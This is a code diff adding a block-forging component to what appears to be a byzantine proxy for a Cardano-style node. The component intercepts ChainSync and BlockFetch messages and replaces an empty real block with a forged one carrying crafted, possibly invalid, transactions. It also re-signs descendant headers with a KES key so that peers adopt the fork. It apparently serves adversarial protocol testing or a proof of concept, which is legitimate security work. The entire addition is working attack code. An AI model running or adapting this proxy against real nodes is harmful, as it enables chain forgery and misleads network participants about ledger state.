@@ -261,3 +261,193 @@ def split_block(block: bytes) -> tuple[bytes, tuple[bytes, bytes, bytes, bytes]]
 
 def assemble_block(header: bytes, segments: tuple[bytes, bytes, bytes, bytes]) -> bytes:
     return encode_array([header, *segments])
+
+
+# --------------------------------------------------------------------------- #
+# Wire substitution (used by byzantine_mux_proxy in ``forge_substitute`` mode)
+# --------------------------------------------------------------------------- #
+
+CHAINSYNC = 2
+BLOCKFETCH = 3
+
+
+def _point_hash(point_raw: bytes) -> bytes | None:
+    point = cbor2.loads(point_raw)
+    if isinstance(point, list) and len(point) == 2 and isinstance(point[1], (bytes, bytearray)):
+        return bytes(point[1])
+    return None
+
+
+def _map_point(point_raw: bytes, mapping: dict[bytes, bytes]) -> bytes:
+    h = _point_hash(point_raw)
+    if h is None or h not in mapping:
+        return point_raw
+    slot_raw = array_items(point_raw)[0]
+    return encode_array([slot_raw, cbor2.dumps(mapping[h])])
+
+
+def _map_tip(tip_raw: bytes, mapping: dict[bytes, bytes]) -> bytes:
+    point_raw, block_no_raw = array_items(tip_raw)
+    return encode_array([_map_point(point_raw, mapping), block_no_raw])
+
+
+def _brief(fields: dict) -> dict:
+    return {"slot": fields["slot"], "block_number": fields["block_number"], "real_hash": fields["hash"]}
+
+
+class ForgeSubstitution:
+    """Serve a forged block in place of one real block, and re-parent its descendants.
+
+    Shared by every proxied connection so all consumers see the same fork. The
+    forge target is the first real header that (a) is at or after ``armed_slot``,
+    (b) has an empty body (so dropping its body loses no transaction), and
+    (c) is signed under the opcert our KES key certifies. Its body is replaced by
+    ``transactions``; every later header whose parent was rewritten is re-signed
+    onto the forged chain (same slot, VRF and body), so the fork stays adoptable
+    until the epoch nonce it feeds is used (two epochs on).
+    ``armed_slot`` is None until the driver arms the forge (setup confirmed on chain).
+    """
+
+    def __init__(self, *, kes_sign_key: bytes, slots_per_kes_period: int, transactions: list[bytes],
+                 armed_slot: int | None = None, record=None):
+        import threading  # noqa: PLC0415
+
+        self.kes_sign_key = kes_sign_key
+        self.slots_per_kes_period = int(slots_per_kes_period)
+        self.tx_parts = [split_transaction(tx) for tx in transactions]
+        self.segments = body_segments(self.tx_parts)
+        self.armed_slot = armed_slot
+        self.lock = threading.RLock()
+        self.real_to_forged: dict[bytes, bytes] = {}
+        self.forged_to_real: dict[bytes, bytes] = {}
+        self.forged_headers: dict[bytes, bytes] = {}   # real hash -> forged header bytes
+        self.target_real: bytes | None = None
+        self.events: list[dict] = []
+        self._record = record or (lambda event: None)
+
+    # ----------------------------------------------------------------- state
+    def arm(self, slot: int) -> None:
+        with self.lock:
+            if self.armed_slot is None:
+                self.armed_slot = int(slot)
+                self._note({"kind": "armed", "slot": int(slot)})
+
+    def _note(self, event: dict) -> None:
+        self.events.append(event)
+        self._record(event)
+
+    def summary(self) -> dict:
+        with self.lock:
+            target = self.target_real
+            return {
+                "armed_slot": self.armed_slot,
+                "target_real_hash": target.hex() if target else None,
+                "forged_hash": self.real_to_forged[target].hex() if target else None,
+                "forged_count": len(self.real_to_forged),
+                "crafted_tx_count": len(self.tx_parts),
+                "crafted_invalid_indices": cbor2.loads(self.segments[3]),
+                "crafted_body_hash": body_hash(self.segments).hex(),
+                "crafted_body_size": body_size(self.segments),
+                "served_target_blocks": sum(1 for e in self.events if e.get("kind") == "served_block" and e.get("target")),
+            }
+
+    # ------------------------------------------------------------- headers
+    def _forge_header(self, header: bytes) -> bytes | None:
+        """Forged replacement for a real header, or None to pass it through."""
+        real = header_hash(header)
+        with self.lock:
+            if real in self.forged_headers:
+                return self.forged_headers[real]
+            fields = header_fields(header)
+            parent = bytes.fromhex(fields["prev_hash"]) if fields["prev_hash"] else None
+            if parent is not None and parent in self.real_to_forged:
+                forged = resign_header(header, kes_sign_key=self.kes_sign_key,
+                                       slots_per_kes_period=self.slots_per_kes_period,
+                                       prev_hash=self.real_to_forged[parent])
+                kind = "reparented"
+            elif (self.target_real is None and self.armed_slot is not None
+                  and fields["slot"] >= self.armed_slot):
+                if fields["body_size"] != body_size(EMPTY_BODY_SEGMENTS):
+                    self._note({"kind": "skipped", "reason": "non-empty real body", **_brief(fields)})
+                    return None
+                try:
+                    forged = resign_header(header, kes_sign_key=self.kes_sign_key,
+                                           slots_per_kes_period=self.slots_per_kes_period,
+                                           segments=self.segments)
+                except ValueError as exc:
+                    self._note({"kind": "skipped", "reason": str(exc), **_brief(fields)})
+                    return None
+                self.target_real = real
+                kind = "forged"
+            else:
+                return None
+            forged_hash = header_hash(forged)
+            self.real_to_forged[real] = forged_hash
+            self.forged_to_real[forged_hash] = real
+            self.forged_headers[real] = forged
+            self._note({"kind": kind, **_brief(fields), "forged_hash": forged_hash.hex(),
+                        "forged_body_hash": header_fields(forged)["body_hash"]})
+            return forged
+
+    # ------------------------------------------------------------ messages
+    def transform(self, protocol: int, from_responder: bool, message: bytes) -> bytes:
+        """Rewrite one complete mini-protocol message; anything unknown passes through."""
+        try:
+            items = array_items(message)
+            key = cbor2.loads(items[0])
+        except Exception:  # noqa: BLE001 - not ours to judge; relay verbatim
+            return message
+        if protocol == CHAINSYNC:
+            return self._chainsync(from_responder, key, items, message)
+        if protocol == BLOCKFETCH:
+            return self._blockfetch(from_responder, key, items, message)
+        return message
+
+    def _chainsync(self, from_responder, key, items, message):
+        if from_responder and key == 2 and len(items) == 3:          # MsgRollForward
+            era_raw, wrapped_raw = array_items(items[1])
+            wrapped = cbor2.loads(wrapped_raw)
+            if not (isinstance(wrapped, cbor2.CBORTag) and wrapped.tag == 24):
+                return message
+            forged = self._forge_header(bytes(wrapped.value))
+            header_raw = items[1] if forged is None else encode_array([era_raw, tag24(forged)])
+            with self.lock:
+                tip = _map_tip(items[2], self.real_to_forged)
+            return encode_array([items[0], header_raw, tip])
+        if from_responder and key in (3, 5) and len(items) == 3:     # RollBackward / IntersectFound
+            with self.lock:
+                return encode_array([items[0], _map_point(items[1], self.real_to_forged),
+                                     _map_tip(items[2], self.real_to_forged)])
+        if from_responder and key == 6 and len(items) == 2:          # IntersectNotFound
+            with self.lock:
+                return encode_array([items[0], _map_tip(items[1], self.real_to_forged)])
+        if not from_responder and key == 4 and len(items) == 2:      # FindIntersect
+            with self.lock:
+                points = [_map_point(p, self.forged_to_real) for p in array_items(items[1])]
+            return encode_array([items[0], encode_array(points)])
+        return message
+
+    def _blockfetch(self, from_responder, key, items, message):
+        if not from_responder and key == 0 and len(items) == 3:      # MsgRequestRange
+            with self.lock:
+                return encode_array([items[0], _map_point(items[1], self.forged_to_real),
+                                     _map_point(items[2], self.forged_to_real)])
+        if from_responder and key == 4 and len(items) == 2:          # MsgBlock
+            wrapped = cbor2.loads(items[1])
+            if not (isinstance(wrapped, cbor2.CBORTag) and wrapped.tag == 24):
+                return message
+            era_raw, block_raw = array_items(bytes(wrapped.value))
+            header, segments = split_block(block_raw)
+            real = header_hash(header)
+            with self.lock:
+                forged = self.forged_headers.get(real)
+                is_target = real == self.target_real
+                if forged is None:
+                    return message
+                if is_target:
+                    segments = self.segments
+                self._note({"kind": "served_block", "real_hash": real.hex(),
+                            "forged_hash": header_hash(forged).hex(), "target": is_target})
+            block = assemble_block(forged, segments)
+            return encode_array([items[0], tag24(encode_array([era_raw, block]))])
+        return message
